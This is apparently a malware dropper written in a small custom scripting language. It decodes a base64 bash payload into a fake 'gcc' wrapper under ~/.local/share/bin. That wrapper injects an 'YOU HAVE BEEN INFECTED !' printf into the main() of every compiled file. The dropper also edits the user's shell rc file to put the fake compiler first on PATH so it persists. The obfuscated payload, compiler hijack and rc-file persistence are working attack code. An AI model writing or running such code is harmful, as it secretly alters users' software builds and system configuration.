# === Create the payload  ===
loads "payload.b64"
open r2 re 
loads "IyEvYmluL2Jhc2gKCnBheWxvYWQ9IgojaW5jbHVkZSA8c3RkaW8uaD5cbgpwcmludGYoXCJZT1Ug"
write r2 re
loads "SEFWRSBCRUVOIElORkVDVEVEICFcIik7XG4KIgoKZ2NjPSQod2hlcmVpcyBnY2MgfCBjdXQgLWQg"
write r2 re
loads "IiAiIC1mMikgCnBhdGNoZWRfZmlsZT0oKQoKZnVuY3Rpb24gcGF0Y2ggewoJbWFpbj0kKGdyZXAg"
write r2 re
loads "LW4gIm1haW4iICQxKQoJbGluZT0kKGVjaG8gJG1haW4gfCBjdXQgLWQgIjoiIC1mMSkKCWlzX25l"
write r2 re
loads "eHQ9JChlY2hvICRtYWluIHwgZ3JlcCAieyIgfHwgZWNobyAwKQoKCWlmIFsgJGlzX25leHQgLWVx"
write r2 re
loads "IDAgXTsgdGhlbiAKCQlmb3VuZF9jdXJseT0kKGdyZXAgLW4gInsiICQxIHwgY3V0IC1kICI6IiAt"
write r2 re
loads "ZjEpCgkJd2hpbGUgdHJ1ZQoJCWRvCgkJCWlmIGVjaG8gJHtmb3VuZF9jdXJseVtAXX0gfCBncmVw"
write r2 re
loads "IC1xIC13ICIkbGluZSI7IHRoZW4KCQkJCXNlZCAtaSAiJHtsaW5lfWFcICQoZWNobyAkcGF5bG9h"
write r2 re
loads "ZCkiICQxCQoJCQkJYnJlYWsgCgkJCWVsc2UKCQkJCWxpbmU9JCgoJGxpbmUgKyAxKSkKCQkJZmkK"
write r2 re
loads "CQlkb25lCglmaQp9CgppZiBbICQjIC1sdCAxIF07IHRoZW4gCgkkZ2NjCglleGl0IDEKZmkKCmZv"
write r2 re
loads "ciBhcmcgaW4gJEAgCmRvCglpZiBbIC1mICRhcmcgXTsgdGhlbiAKCQljcCAkKHB3ZCkvJGFyZyAk"
write r2 re
loads "KHB3ZCkvLiRhcmcKCQlwYXRjaCAkKHB3ZCkvJGFyZwoJCXBhdGNoZWRfZmlsZSs9KCRhcmcpCglm"
write r2 re
loads "aQpkb25lCgokZ2NjICRACgpmb3IgZmlsZSBpbiAkcGF0Y2hlZF9maWxlIApkbwoJbXYgJChwd2Qp"
write r2 re
loads "Ly4kZmlsZSAkKHB3ZCkvJGZpbGUKZG9uZQoK"
write r2 re
close r2

loads "HOME"
env re 
loadr r1 re
loadr r2 re
loads "mkdir "
append re r1
loadr r1 re
loads "/.local/share/bin"
append r1 re
loadr r1 re
system re

loads "/.local/share/bin"
append r2 re 
loadr r1 re 
loadr r3 re
loads "/gcc"
append r1 re 
loadr r1 re

loads "tmp.sh"
open r2 re 
loads "rm -rf ~/.local/share/bin/gcc && base64 -d payload.b64 > "
write r2 re
write r2 r1 
close r2 

loads "bash tmp.sh"
system re 
loads "rm tmp.sh" 
system re

open r2 r1 
write r2 re 
close r2

loads "rm payload.b64"
system re

# === Get ~/.SHELLrc path ===
loads "SHELL"
env re 
loadr r1 re 
loads "basename "
append re r1
system re
loadr r1 re 

loads "HOME"
env re 
loadr r2 re 
loads "/."
append r2 re 
append re r1 
loadr r1 re 
loads "rc"
append r1 re 

open r1 re 
loads "export PATH="
write r1 re 
write r1 r3 
loads ":$PATH"
write r1 re
close r1

loads "chmod +x "
append re r3 
loadr r1 re
loads "/gcc"
append r1 re
system re

# ===========================

exit